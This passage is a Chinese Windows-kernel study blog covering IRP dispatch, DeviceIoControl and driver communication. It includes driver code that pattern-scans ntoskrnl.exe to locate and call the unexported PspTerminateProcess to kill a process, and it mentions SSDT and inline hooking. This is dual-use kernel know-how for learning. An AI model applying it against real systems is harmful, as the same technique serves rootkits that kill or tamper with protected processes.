那这个Parameters该如何用呢？举个例子，假设3环程序调用了DeviceIoControl函数，在0环，就会构造一个IRP_MJ_DEVICE_CONTROL这个类型的IRP，然后我们就可以构建它的派遣函数了。在派遣函数中，当我们获得了当前驱动的栈单元时，就可以通过如下语句访问3环函数DeviceIoControl的参数了，例如： c12345//获取IO_STACK_LOCATIONPIO_STACK_LOCATION pStackLocation = IoGetCurrentIrpStackLocation(pIrp);//获取3环函数参数ULONG InputBufferLength = pStackLocation->Parameters.DeviceIoControl.InputBufferLength;ULONG FsControlCode = pStackLocation->Parameters.DeviceIoControl.IoControlCode; 其中，IoGetCurrentIrpStackLocation函数，将Irp指针传进去，可以获取当前驱动程序对应的栈单元。接着就可以通过栈单元获取我们想要的参数了 3环与0环通信（升级）操作码在了解了上述知识后，我们就可以对前一篇文章中的代码进行一次升级，更清晰的看到3环和0环的信息交互过程。在此之前，我们需要了解一个操作码。本次实验会在3环程序中新增一个DeviceIoControl函数，因为这个函数能既有传入的参数，也有输出的参数，可以比较直观的看明白3环和0环交互的数据。具体定义如图： 其中需要解释一下的，就是这个dwIoControlCode参数，这个就相当于Switch语句中传入的那个参数，用来判断程序执行流程用的，当操作码不同时，执行的功能也不同，操作码定义如下： c12#define OPCODE1 CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)#define OPCODE2 CTL_CODE(FILE_DEVICE_UNKNOWN, 0x900, METHOD_BUFFERED, FILE_ANY_ACCESS) CTL_CODE函数，会接收这四个参数，并通过某一种算法，生成一个四字节的操作码，3环和0环中用的是同一套操作码，其中第二个参数，这个值必须选定一个大于等于0x800的值，之前的值由系统保留使用。 新增代码本次实验新增的代码，就是在3环程序增加了DeviceIoControl这个函数，以及相应的驱动增加了派遣函数。具体变化如下： Ring3新增部分： c123456789101112131415161718192021#define OPCODE1 CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)#define OPCODE2 CTL_CODE(FILE_DEVICE_UNKNOWN, 0x900, METHOD_BUFFERED, FILE_ANY_ACCESS)//Call IRP_MY_DEVICE_CONTROL getchar(); char pInputBuffer[20] = {1, 2, 4, 8, 16, 32, 64, 0}; char pOutputBuffer[20] = {0}; DWORD dwReturnSize = 0; BOOL bDIC = DeviceIoControl(hDevice, OPCODE2, pInputBuffer, 8, pOutputBuffer, 20, &dwReturnSize, NULL); if(bDIC != 0){ printf(\"ReturnSize: %x\\n\", dwReturnSize); printf(\"OutputBuffer: \"); for(int i = 0; i < dwReturnSize; i++){ printf(\"%x \", pOutputBuffer[i]); } } else { printf(\"Communicate Failed!\\n\"); return -1; } printf(\"\\nRing3 And Ring0 Communicate Success!\\n\"); 代码中传入一个初始化了8个字节的数组，并且用另一个空数组来接收0环的数据，DeviceIoControl执行完后，根据返回的长度大小，以及返回的Buffer，来打印返回的数据。 Ring0新增部分： c12345678910111213141516171819202122232425262728293031323334#define OPCODE1 CTL_CODE(FILE_DEVICE_UNKNOWN,0x800,METHOD_BUFFERED,FILE_ANY_ACCESS)#define OPCODE2 CTL_CODE(FILE_DEVICE_UNKNOWN,0x900,METHOD_BUFFERED,FILE_ANY_ACCESS)NTSTATUS IrpDeviceControlProc(PDEVICE_OBJECT pDeviceObj, PIRP pIrp) { DbgPrint(\"Irp DeviceControl Dispatch Function...\\n\"); //获取缓冲区数据 PVOID pSystemBuffer = pIrp->AssociatedIrp.SystemBuffer; //获取IO_STACK_LOCATION PIO_STACK_LOCATION pStackLocation = IoGetCurrentIrpStackLocation(pIrp); ULONG InputBufferLength = pStackLocation->Parameters.DeviceIoControl.InputBufferLength; ULONG FsControlCode = pStackLocation->Parameters.DeviceIoControl.IoControlCode; //判断操作码 switch (FsControlCode) { case OPCODE1: DbgPrint(\"不打印操作码\"); pIrp->IoStatus.Status = STATUS_SUCCESS; pIrp->IoStatus.Information = 2; break; case OPCODE2: DbgPrint(\"操作码：%x\\n\", FsControlCode); for (UINT32 i = 0; i < InputBufferLength; i++) { DbgPrint(\"Ring3 Data: %x\\n\", ((PUCHAR)pSystemBuffer)[i]); } pIrp->IoStatus.Status = STATUS_SUCCESS; pIrp->IoStatus.Information = 5; break; } IoCompleteRequest(pIrp, IO_NO_INCREMENT); return STATUS_SUCCESS;} 来简要看一下派遣函数的执行流程： 由于在设备对象的Flags字段定义过缓冲区读取的类型是（DO_BUFFERED_IO），因此我们可以直接从AssociatedIrp.SystemBuffer中读取3环传入的数据，也就是DeviceIoControl中pInputBuffer参数指向的数据。 通过IoGetCurrentIrpStackLocation函数获取到栈单元，再通过栈单元获取到Parameters中DeviceIoControl结构体里对应的参数 c123456struct { ULONG OutputBufferLength; ULONG POINTER_ALIGNMENT InputBufferLength; ULONG POINTER_ALIGNMENT IoControlCode; PVOID Type3InputBuffer; } DeviceIoControl; 这里我们仅取操作码IoControlCode，用于判断执行流程；以及InputBufferLength，用于打印传入数据 然后就是根据操作码的不同，执行不同的流程了： 1）操作码1：不做任何操作，向3环返回2字节大小的数据 2）操作码2：打印操作码的值；根据传入数据的长度，打印传入的数据；向3环返回5字节大小的数据 完整代码及演示见下篇参考链接参考书籍： 《Windows内核原理与实现》 参考文章： https://www.cnblogs.com/LittleHann/p/3450436.html https://www.cnblogs.com/lfls128/p/4982309.html https://blog.csdn.net/qq_41988448/article/details/103519478 参考笔记： Joney，张嘉杰 参考文档： https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_irp#irp_mj_read https://docs.microsoft.com/zh-cn/windows-hardware/drivers/ddi/wdm/ns-wdm-_io_stack_location https://docs.microsoft.com/zh-cn/windows-hardware/drivers/ddi/wdm/nf-wdm-iogetcurrentirpstacklocation https://docs.microsoft.com/zh-cn/windows-hardware/drivers/ddi/wdm/ns-wdm-_io_status_block https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-iocreatedevice 关于更新上周过的比较迷，不知道该干什么，因为进度远远落后于计划，日更变得困难了起来，白天完善代码，晚上也来不及更新博客。自身的确有很大问题，比起刚开始的热情，现在没那么有干劲了，人放松了很多，这是个不好的现象。实际上，经历了清明三天的假期，我也逐渐看清了自己。较差的自制力，学习时无法集中注意力等。看着四哥的RMI文章都已经更新到第九篇了，真的自愧不如，我才20出头，却如此懈怠，懒惰。现在已经是4月19号的下午了，而这篇文章原本是13号该更新的（按照日更的进度）。而我目前为止，已经完善的代码仅有SSDT Hook，Inline Hook的代码，在UnHook方面还有一定的瑕疵，还未能完好的解决。日更，不那么现实了，当然，更多的是自身的原因，如果不再日更，就更不知道自己还能不能坚持下来了。但这的确不该放弃，毕竟博客还是一个沉淀知识，分享知识的地方。 这几天，我曾考虑过，写点别的，内容较少的，来维持日更的状态，但是比较恐怖的是，我发现自己并没有足够的内容来写，自身真正掌握的知识太少了，这是非常恐怖的，我也学了这么久计算机了，但是发现，在很多领域，仅仅只是知道点皮毛而已，完全没有知识的积淀。所以，需要提升技术栈的同时也提升深度。 最后一个是，基本上更新完SSDT和Inline Hook这两篇后，驱动剩下的东西就不多了。接下来还有多核同步，句柄表以及APC。中级上的部分也就结束了，但是APC需要分析大量的内核函数，内容巨多，看到群友张嘉杰已经分析完了，真的是非常厉害。到了中级下，没了线上的视频，就得自己探索和扩展一些内容了。我计划在下周更新完内核重载后，就考虑更一些Android或者Web相关的基础内容了。不过由于决定不再日更了，后面内容可能也会更冗长了，但是会更细致一些","categories":[],"tags":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://cata1oc.github.io/tags/Windows%E5%86%85%E6%A0%B8/"}]},{"title":"3环与0环通信（常规方式）","slug":"3环与0环通信（常规方式）","date":"2020-04-12T15:26:24.000Z","updated":"2020-05-07T12:29:34.558Z","comments":true,"path":"2020/04/12/3环与0环通信（常规方式）/","link":"","permalink":"http://cata1oc.github.io/2020/04/12/3%E7%8E%AF%E4%B8%8E0%E7%8E%AF%E9%80%9A%E4%BF%A1%EF%BC%88%E5%B8%B8%E8%A7%84%E6%96%B9%E5%BC%8F%EF%BC%89/","excerpt":"","text":"本篇介绍一下3环与0环通信的原理（常规方式），介绍与之相关的结构体，对象等，最后代码实现并模拟操作系统进行3环和0环的通信。 设备对象内核通信的对象内核中的通信，与应用层窗口间的通信类似，只是封装消息的结构体不同，接收消息结构体的对象不同 窗口通信： 1）消息结构体：MSG 2）接收消息的对象：窗口对象（Hwnd） 内核通信： 1）消息结构体：IRP（I/O Request Package） 2）接收消息的对象：设备对象（DeviceObject） 所以想要在内核通信，需要有(至少)一个用来接收和发送消息的设备对象。 创建设备对象窗口对象的创建也与设备对象也有不少共同点，这里继续拿来类比 窗口对象：1）可以创建多个 2）需要指定父窗口 设备对象：1）可以创建多个 2）需要指定所属驱动对象 Windows提供了内核函数IoCreateDevice用来创建设备对象，参考如下代码： c1234567891011121314151617#define DEVICE_NAME L\"\\\\Device\\\\MyDevice\" PDEVICE_OBJECT pDeviceObj = NULL;UNICODE_STRING DeviceName;RtlInitUnicodeString(&DeviceName, DEVICE_NAME);NTSTATUS status = IoCreateDevice(pDriverObj, 0, &DeviceName, FILE_DEVICE_UNKNOWN, 0, FALSE, &pDeviceObj); if (status != STATUS_SUCCESS) { DbgPrint(\"Device Create Failed!\\n\"); return status;} pDriverObj：指定该设备创建后属于哪个驱动对象（PDRIVER_OBJECT） &DeviceName：定义了一个DEVICE_NAME的宏，被用来初始化设备对象的名字。这个名字不能随便改（即”\\\\Device\\\\xxxxx”形式），在设备创建时，会根据设备名，将该设备挂到一个名为Device的树形结构中，几乎所有设备都挂在这。若改变此值，则会挂到其它树中。 FILE_DEVICE_UNKNOWN：该处填写设备的类型，由于我们并没有实际的设备，所以选择UNKNOWN &pDeviceObj：这个参数可以看作是一个二级指针，它指向一个地址。这个地址存着一个指针pDeviceObj，这个指针指向一个设备结构体。另一个要说明的是，这个参数是一个OUT类型的参数，原本pDeviceObj指向的内容是空的，在执行完设备创建的函数后，其指向创建出的设备对象。 以上为几个比较关键的参数介绍，其余参数按照上述代码填写即可，具体含义可以参考官方文档 数据传输方式 首先查看一下设备对象这个结构体，发现它有很多字段，这里我们只需要关注其中一个，就是Flags，这是一个四字节的值，设置了3环和0环数据交互的方式。语法如下： c12//这里必须是“|=”，不能直接写成“=”pDeviceObj->Flags |= DO_BUFFERED_IO; 来看看有哪几种方式： 缓冲区方式读写（DO_BUFFERED_IO）：I/O管理器会在内核空间中分配一块内存，把用户空间的数据复制到这块内存中，这样内核程序就可以访问这些数据，实现数据通信。适合数据量较小时使用。（之前介绍的跨进程读取内存用的就是这种方法） 直接方式读写（DO_DIRECT_IO）：I/O管理器会将用户空间内的某片内存对应的物理页锁住，同时在内核空间再映射一份，这样内核空间线性地址与用户空间线性地址对应的是同一个物理页，这是双方均可以对这个物理页的内容进行读写，实现数据通信，此方法适合数据量较大时使用。（类似_KUSER_SHARED_DATA结构） 默认方式读写（NEITHER_IO）：当创建完设备对象后，不设置Flags的值，使用的就是此类读写方式。默认读写方式，仅仅提供给内核程序用户空间的线性地址，直接进行数据的读取。这样做的坏处是，如果发生线程切换，读取的就不再是同一份数据，容易造成程序读取错误。 通常情况下，我们实验的数据不会太大，主要采取DO_BUFFERED_IO这种方式。这里有一点要注意的是，在设置DeviceObject.Flags的值时，千万不要直接用”=”，必须使用”|=”，因为在创建设备对象结构体时，Flags是有初始值的，若这里直接给Flags赋值，会刷新掉之前的初始值，导致程序执行时发生错误（驱动技仅能成功执行一次，第二次会失败）。 设置符号链接Windows规定，应用层的程序是不能直接访问设备对象的，所以符号链接诞生了。符号链接可以与设备对象绑定，这样应用层的程序就可以通过符号链接进行对设备对象的访问。符号链接在内核与3环的形式有所不同： 内核：符号链接以”\\??\\“开头，例如C盘就是”\\??\\C:” 用户模式：符号链接以”\\\\.\\“开头，例如C就算”\\\\.\\C:” 具体在代码中还需要加入更多的“\\“用来转译符号，代码如下： Ring0c12345#define SYM_LINK_NAME L\"\\\\??\\\\MyRing3Device\"UNICODE_STRING SymbolicLinkName;RtlInitUnicodeString(&SymbolicLinkName, SYM_LINK_NAME);IoCreateSymbolicLink(&SymbolicLinkName, &DeviceName); Ring3c1234567891011#define SYM_LINK_NAME L\"\\\\\\\\.\\\\MyRing3Device\"//3环这里直接使用符号链接指向0环创建设备作为CreateFile的参数//不用再次设置符号链接，符号链接是在0环设置的，这里在3环主要介绍用法HANDLE hDevice = CreateFileW( SYM_LINK_NAME, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); IRP与派遣函数对比消息处理先来看一张图 继续拿3环的窗口应用来做对比 用户空间：当用户单击鼠标时，会触发一个事件，操作系统会将这个事件的内容描述信息封装到一个MSG结构中，作为消息，发送给窗口对象，窗口对象接收到消息，会根据这个消息的类型，来执行相应的处理函数，我们称这种处理函数叫做回调函数。 1）触发事件：鼠标点击等 2）消息结构体：MSG 3）消息接收对象：窗口对象 4）处理函数：窗口回调函数 内核空间：当3环程序调用CreateFile函数时，这是操作系统会产生相应的IRP，这个IRP封装了3环程序调用的相关描述信息，接着会把IRP发送给内核空间的设备对象，设备对象会解析IRP，然后会根据IRP提供的信息，执行相应的派遣函数 1）触发事件：3环程序调用CreateFile函数等 2）消息结构体：IRP 3）消息接收对象：设备对象 4）处理函数：派遣函数 IRP的类型正如3环的窗口对象，在接收到不同类型消息时会执行不同的回调函数。当应用层通过CreateFile，ReadFile，WriteFile，CloseHandle等函数对设备进行操作时，也会使操作系统产生不同种类的IRP，这里简要总结一下部分3环函数与IRP的对应关系： 应用层函数 IRP种类 CreateFile IRP_MJ_CREATE ReadFile IRP_MJ_READ WriteFile IRP_MJ_WRITE CloseHandle IRP_MJ_CLOSE DeviceIoControl IRP_MJ_DEVICE_CONTROL 派遣函数1）注册派遣函数当IRP传递给设备对象后，会根据IRP的种类调用特定的派遣函数。不同的IRP对应不同的派遣函数，NT框架预定了28种派遣函数，可以在驱动对象MajorFunction数组中注册这些派遣函数 代码示例： c123//这里仅设置了两个用来演示pDriverObj->MajorFunction[IRP_MJ_CREATE] = IrpCreateProc;pDriverObj->MajorFunction[IRP_MJ_CLOSE] = IrpCloseProc; 其中IrpCreateProc和IrpCloseProc都是我们需要自己定义的派遣函数，遵守一定的格式 2）派遣函数格式这里以IrpCreateProc来举例： c1234567891011NTSTATUS IrpCreateProc(PDEVICE_OBJECT pDeviceObj, PIRP pIrp) { DbgPrint(\"Irp Create Dispatch Function...\\n\"); /* 处理自己的业务 */ pIrp->IoStatus.Status = STATUS_SUCCESS; pIrp->IoStatus.Information = 0; IoCompleteRequest(pIrp, IO_NO_INCREMENT); return STATUS_SUCCESS;} 参数： 1）设备对象指针 2）IRP指针 IRP是一个结构体，通过指针可以指向IRP内部的一个字段IoStatus（_IO_STATUS_BLOCK结构），该结构中有两个字段： 1）Status：三环程序调用GetLastError得到的就是这个值 2）Information：返回给3环多少数据，没有则填0 IoCompleteRequest：表示调用方已完成所有I/O请求处理操作，并将给定的IRP返回给I/O管理器 以上是必须设置的值/执行的语句，完成后，即可 代码实现有了以上基础后就可以实现简单的3环和0环的通信了，这里附上代码： Ring0c1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586#include \"ntifs.h\"#define DEVICE_NAME L\"\\\\Device\\\\MyDevice\"#define SYM_LINK_NAME L\"\\\\??\\\\MyRing3Device\"#define OPER1 CTL_CODE(FILE_DEVICE_UNKNOWN,0x800,METHOD_BUFFERED,FILE_ANY_ACCESS)VOID Drvier_Unload(PDRIVER_OBJECT pDriverObj);NTSTATUS IrpCreateProc(PDEVICE_OBJECT pDeviceObj, PIRP pIrp);NTSTATUS IrpCloseProc(PDEVICE_OBJECT pDeviceObj, PIRP pIrp);//Driver Entry NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObj, PUNICODE_STRING RegistryPath) { DbgPrint(\"Driver is running!\\n\"); PDEVICE_OBJECT pDeviceObj = NULL; NTSTATUS status = 0; //Create Deivce Object UNICODE_STRING DeviceName; RtlInitUnicodeString(&DeviceName, DEVICE_NAME); status = IoCreateDevice(pDriverObj, 0, &DeviceName, FILE_DEVICE_UNKNOWN, 0, FALSE, &pDeviceObj); if (status != STATUS_SUCCESS) { DbgPrint(\"Device Create Failed!\\n\"); return status; } else { DbgPrint(\"Device Create Success!\\n\"); } //Set Communicate Ways //注意这里一定要用\"|=\", 而不能直接用\"=\",因为在创建Device pDeviceObj->Flags |= DO_BUFFERED_IO; //Create Symbollic Link UNICODE_STRING SymbolicLinkName; RtlInitUnicodeString(&SymbolicLinkName, SYM_LINK_NAME); IoCreateSymbolicLink(&SymbolicLinkName, &DeviceName); //Set Dispatch Function pDriverObj->MajorFunction[IRP_MJ_CREATE] = IrpCreateProc; pDriverObj->MajorFunction[IRP_MJ_CLOSE] = IrpCloseProc; //Set Unload Function pDriverObj->DriverUnload = Drvier_Unload; return STATUS_SUCCESS;}NTSTATUS IrpCreateProc(PDEVICE_OBJECT pDeviceObj, PIRP pIrp) { DbgPrint(\"Irp Create Dispatch Function...\\n\"); pIrp->IoStatus.Status = STATUS_SUCCESS; pIrp->IoStatus.Information = 0; IoCompleteRequest(pIrp, IO_NO_INCREMENT); return STATUS_SUCCESS;}NTSTATUS IrpCloseProc(PDEVICE_OBJECT pDeviceObj, PIRP pIrp) { DbgPrint(\"Irp Close Dispatch Function...\\n\"); pIrp->IoStatus.Status = STATUS_SUCCESS; pIrp->IoStatus.Information = 0; IoCompleteRequest(pIrp, IO_NO_INCREMENT); return STATUS_SUCCESS;}VOID Drvier_Unload(PDRIVER_OBJECT pDriverObj) { //Delete SymbolicLink UNICODE_STRING SymbolicLinkName; RtlInitUnicodeString(&SymbolicLinkName, SYM_LINK_NAME); IoDeleteSymbolicLink(&SymbolicLinkName); //Delete Deivce IoDeleteDevice(pDriverObj->DeviceObject); DbgPrint(\"Unload Success!\\n\");} Ring3c1234567891011121314151617181920212223242526272829303132333435363738#include \"stdafx.h\"#include \"Windows.h\"#include \"winioctl.h\"#define OPCODE1 CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)#define OPCODE2 CTL_CODE(FILE_DEVICE_UNKNOWN, 0x900, METHOD_BUFFERED, FILE_ANY_ACCESS)#define SYM_LINK_NAME L\"\\\\\\\\.\\\\MyRing3Device\"int main(int argc, char* argv[]){ //Call IRP_MJ_CREATE getchar(); HANDLE hDevice = CreateFileW( SYM_LINK_NAME, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); if (hDevice == INVALID_HANDLE_VALUE){ printf(\"Create File Failed!\"); getchar(); return -1; } else { printf(\"Create File Success!\"); } //Call IRP_MJ_CLOSE getchar(); BOOL bCH = CloseHandle(hDevice); if(bCH != 0){ printf(\"Close File Success!\"); } getchar(); return 0;} 程序测试 载入并运行驱动 运行3环程序 执行CreateFile 执行CloseHandle 查看运行结果，可以看到，在调用3环函数时，会执行相应的驱动函数。若想增加相应功能，只需在派遣函数中写上，即可在调用3环函数时执行，实现3环和0环的通信。当然，这样的结果，看着并不明显，下一篇，会介绍IRP这个结构，并进一步完善这份代码 参考链接参考教程：https://www.bilibili.com/video/BV1NJ411M7aE?p=61 参考笔记：Joney，张嘉杰 参考代码：Joney，张嘉杰","categories":[],"tags":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://cata1oc.github.io/tags/Windows%E5%86%85%E6%A0%B8/"}]},{"title":"特征码搜索","slug":"特征码搜索","date":"2020-04-11T07:51:51.000Z","updated":"2020-04-13T16:02:42.408Z","comments":true,"path":"2020/04/11/特征码搜索/","link":"","permalink":"http://cata1oc.github.io/2020/04/11/%E7%89%B9%E5%BE%81%E7%A0%81%E6%90%9C%E7%B4%A2/","excerpt":"","text":"本篇进行一个小实验，编写一个函数，通过特征码搜索一个未导出函数（PspTerminateProcess），并调用。看着不复杂，但是涉及到了很多细节，这里逐步分析。 什么是未导出函数先介绍一个概念，未导出函数。什么是未导出函数呢？ 这个举个简单的例子，Ntoskrnl.exe中有很多内核函数，其中包括我们之前分析过的NtReadVirtualMemory函数。这个函数是ReadProcessMemory在0环的实现，但它是一个未导出函数，用IDA打开Ntoskrnl.exe，在Exports（导出表）中搜索NtReadVirtualMemory 结果发现，并没有搜索到NtReadVirtualMemory，原因是它并没有被导出，所以导出表里面，没有该函数，但是这个函数又的确存在在Ntoskrnl.exe这个模块中。 未导出函数的主要目的，是不想提供给别人使用，官方文档也不会写入相关内容。因此，我们是不能通过函数名直接调用该函数的。 如何调用未导出函数调用未导出函数主要有两种办法： 特征码搜索，这也是本篇会着重介绍的。在前一篇文章中，提到过可以通过驱动结构体的DriverSection字段，找到一个_LDR_DATA_TABLE_ENTRY结构体，然后即可遍历内核的全部模块。这时，如果我们确定了未导出函数所在的模块，便可以通过在链表中找到模块对应的描述信息，例如模块基址，大小等。这时，我们再利用这些信息，结合未导出函数的特征码，搜索这个模块的内存，便能找到所需的未导出函数。这时只需定义一个函数指针，指向咱们找到的函数首地址，就可以实现对未导出函数的调用。 外层函数调用，如果有一个函数A调用了未导出函数B，那么函数A中一定有未导出函数B的函数地址，我们只要找到这个调用点，就可以确定函数B的地址了。然后再定义一个函数指针，就可实现这个过程。 特征码选择在特征码的选择上也是有讲究的，拿本次实验的PspTerminateProcess函数来举例 结合图片来看。 橙色方框圈住的地方就不适合作为特征码，这部分的语句，比较常见，在很多内核函数中都容易看到，因此不适合作为特征码，有可能会因此找到了别的内核函数。 红色方框圈住的地方相对来说就比较适合作为特征码，当然，连续四行完全相同的语句，还是比较少见的，因此，选中的代码段越多，就越合适作为特征码 有一点需要说明的是，特征码不是汇编，而是硬编码，具体应用时，可以将这些特征码放入到一个字符串中，例如： c1UCHAR AttrCode[6] = {0x8b, 0x75, 0x08, 0x3b, 0x70, 0x44} 然后与指定的内存进行逐一比较，若发现相同的地方，很有可能就找对了对方，然后再减去函数内的偏移，得到函数的首地址，就可以获取该函数了 代码实现这部分的代码实现不是非常难，并且用到了前一篇用到的知识，这里仅再重述一遍思路： 通过当前驱动结构体找到内核模块结构体链表 遍历内核模块，找到Ntoskrnl.exe（PspTerminateProcess所在模块）模块结构体 获取模块基址、模块大小 确定特征码 从模块基址开始的地方，与特征码依次进行比对，从而找到未导出函数PspTerminateProcess 用一个函数指针指向未导出函数 调用函数PspTerminateProcess c1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798#include \"ntifs.h\"typedef NTSTATUS NTKERNELAPI(*PspTerminateProcess)(PEPROCESS Process, NTSTATUS ExitStatus);VOID Driver_Unload(PDRIVER_OBJECT driver);UINT32 FindKernelModule(PDRIVER_OBJECT driver);PVOID FindAttrCode(PDRIVER_OBJECT driver);VOID TestFunc(PDRIVER_OBJECT driver);NTSTATUS DriverEntry(PDRIVER_OBJECT driver, PUNICODE_STRING RegistryPath) { DbgPrint(\"Driver is running!\\n\"); TestFunc(driver); driver->DriverUnload = Driver_Unload; return STATUS_SUCCESS;}VOID TestFunc(PDRIVER_OBJECT driver) { PspTerminateProcess pFun; PEPROCESS pEprocess; pFun = FindAttrCode(driver); if (pFun != NULL) { // DbgPrint(\"Get Success\\n\"); //PID的值根据具体进程而定 PsLookupProcessByProcessId((HANDLE)1752, &pEprocess); pFun(pEprocess, 1); DbgPrint(\"Close notepad success!\"); } else { DbgPrint(\"Get Failed\\n\"); }}PVOID FindAttrCode(PDRIVER_OBJECT driver) { UINT32 i = 0; UINT32 ds = FindKernelModule(driver); UINT32 ModuleBase = *(PUINT32)(ds + 0x18); UINT32 ModuleSize = *(PUINT32)(ds + 0x20); //+0xC UCHAR Offset[15] = { 0x8b, 0x75, 0x08, 0x3b, 0x70, 0x44, 0x75, 0x07, 0xb8, 0x0d, 0x00, 0x00, 0xc0, 0xeb, 0x5a }; PUCHAR pModuleMemory = NULL; __try { DbgPrint(\"Name: %wZ, Base: %x, Size: %x\\n\", (PUINT32)(ds + 0x2c), ModuleBase, ModuleSize); while (i < (ModuleSize - 0xf)) { pModuleMemory = (PUCHAR)(ModuleBase + i); if (RtlCompareMemory(Offset, pModuleMemory, 0xf) == 0xf) { // DbgPrint(\"%016x\", *pModuleMemory); return pModuleMemory - 0xc; } i++; } } __except (1) { } return NULL;}UINT32 FindKernelModule(PDRIVER_OBJECT driver) { UINT32 ds, dsCurrent, dsDest; UNICODE_STRING dllStr; RtlInitUnicodeString(&dllStr, L\"ntoskrnl.exe\"); // DbgPrint(\"_Driver_Object: %x\\n\", driver); // DbgPrint(\"_LDR_DATA_TABLE_ENTRY: %x\\n\", driver->DriverSection); ds = (UINT32)(driver->DriverSection); dsCurrent = ds; // DbgPrint(\"Name: %wZ, Base: %x, Size: %x\\n\", (PUINT32)(ds + 0x2c), *(PUINT32)(ds + 0x18), *(PUINT32)(ds + 0x20)); while (1) { ds = *(PUINT32)ds; if (ds == dsCurrent) { break; } if (RtlCompareUnicodeString(&dllStr, (PUINT32)(ds + 0x2c), TRUE) == 0) { // DbgPrint(\"Name: %wZ, Base: %x, Size: %x\\n\", (PUINT32)(ds + 0x2c), *(PUINT32)(ds + 0x18), *(PUINT32)(ds + 0x20)); break; } } dsDest = ds; return dsDest;}VOID Driver_Unload(PDRIVER_OBJECT driver) { DbgPrint(\"Unload Success!\");} 结果验证 本次实验，计划通过调用未导出函数PspTerminateProcess关掉指定进程（本次实验采用记事本） 在PC Hunter确定记事本的Pid 写入到代码中 生成.sys驱动文件，复制到虚拟机。通过Kmd Manager注册 运行该驱动，查看结果 发现成功的关掉了记事本这个进程 总结本次实验，通过在内存中搜索特征码，调用了一个未导出函数PspTerminateProcess，并关掉了记事本这个进程，当然我们是手动将Pid填入代码后才实现的指定进程，随着进一步学习，会逐渐改进并完善这份代码 参考文章：https://blog.csdn.net/jjjyu123/article/details/13616277 参考代码：上善若水，葫芦娃救爷爷，Joney，张嘉杰","categories":[],"tags":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://cata1oc.github.io/tags/Windows%E5%86%85%E6%A0%B8/"}]},{"title":"内核空间&内核模块","slug":"内核空间和内核模块","date":"2020-04-10T01:02:27.000Z","updated":"2020-07-03T02:40:54.844Z","comments":true,"path":"2020/04/10/内核空间和内核模块/","link":"","permalink":"http://cata1oc.github.io/2020/04/10/%E5%86%85%E6%A0%B8%E7%A9%BA%E9%97%B4%E5%92%8C%E5%86%85%E6%A0%B8%E6%A8%A1%E5%9D%97/","excerpt":"","text":"对编写基础的驱动有所了解后，我们来进一步了解一下内核，本篇会介绍两个概念，内核空间以及内核模块，先从内核空间说起。 内核空间内核空间的概念，我们还是比较熟悉的。这里我们主要关注一点，就是不同进程在低2G内存空间对应的物理页往往是不同的，而在高2G内存空间对应的物理页往往是相同的。如图： 这一要素，主要运用于跨进程读取内存等手法，之前的文章也提到过，这里我们来验证一下这个理论： 第一步，写一个驱动，获取全局变量的地址，程序比较简单，就不贴代码了，直接上图 第二步运行驱动，在DebugView中可以看到该全局变量的线性地址：0xbac93000 然后我们随机打开一个应用，这里以记事本为例。打开后，在Windbg中，找到记事本的Cr3查看该进程在线性地址0xbac93000处的值为多少 可以发现，我们在记事本这个进程中查看0xbac93000这个线性地址对应的物理页时，它所存着的值恰好是我们在另一个驱动中定义的全局变量的值。这正说明了，不同进程在高2G中对应的物理页是相同的。（这里解释一下 .process 这个指令的作用，0xaaaabbbb对应着某个进程的进程结构体的地址，.process aaaabbbb这个指令就相当于切换到这个进程，之后所访问的地址，都是这个进程地址空间中的地址） 内核模块基本概念有了内核空间的概念，这里介绍另一个概念，内核模块。看图 硬件种类繁多，不可能做出一个兼容所有硬件的内核，所以，微软提供规定的接口格式，让硬件驱动人员按照规定的格式编写“驱动程序”。当然，并不是每个驱动程序一定需要关联一个硬件，也可以仅仅是一个程序，就如同我们之前所写的。 这些驱动程序，每一个都是一个模块，称为“内核模块”，都可以加载到内核中，也都遵守PE结构。本质上，任意一个.sys文件与内核文件（例如ntoskrnl.exe）没有区别。 有了上述概念后，我们可以打个比喻，内核空间（高2G），相当于一个进程；而各个加载到内核中的内核模块，就相当于加载到进程中的DLL；内核模块提供0环的函数实现以及硬件的程序驱动，DLL为这个进程提供额外功能。这样就好理解了。 DRIVER_OBJECT在之前编写的驱动程序中，入口函数总会传递一个参数，它的类型是PDRIVER_OBJECT，说明这是一个指向DRIVER_OBJECT的指针，而DRIVER_OBJECT正是驱动模块对应的结构体，来描述该驱动的相关信息。 由图，这里着重介绍四个比较关键的字段： DriverStart(+0x00C)：驱动模块在内核中的地址 DriverSize(+0x010)：驱动模块在内核中的大小 DriverName(+0x01C)：驱动模块在内核中的名字 DriverSection(+0x014)：这个位置存的是一个指针，指向一个_LDR_DATA_TABLE_ENTRY结构体 LDR_DATA_TABLE_ENTRY驱动在内核中也属于内核模块，该结构体描述了内核模块的相关信息，同时包含串着所有内核模块的双向链表，通过该链表，可以遍历所有内核模块。 InLoadOrderLinks(+0x000)：串着所有内核模块的双向链表 DllBase(+0x018)：当前内核模块的基址 SizeOfImage(+0x020)：当前内核模块的大小 FullDllName(+0x024)：当前内核模块的完整路径 BaseDllName(+0x02C)：当前内核模块的模块名 内核模块遍历有了上面这些基础后呢，就可以自己实现内核模块遍历的功能了。这里先说一下思路： 首先我们写一个驱动，驱动函数的入口会传一个PDRIVER_OBJECT这个参数，我们就可以利用这个参数，获取到自身驱动的DRIVER_OBJECT 有了DRIVER_OBJECT结构体后，就可以通过其偏移0x014位置处的值，找到LDR_DATA_TABLE_ENTRY结构体，该结构体的第一个元素，就是串着所有内核模块的双向链表 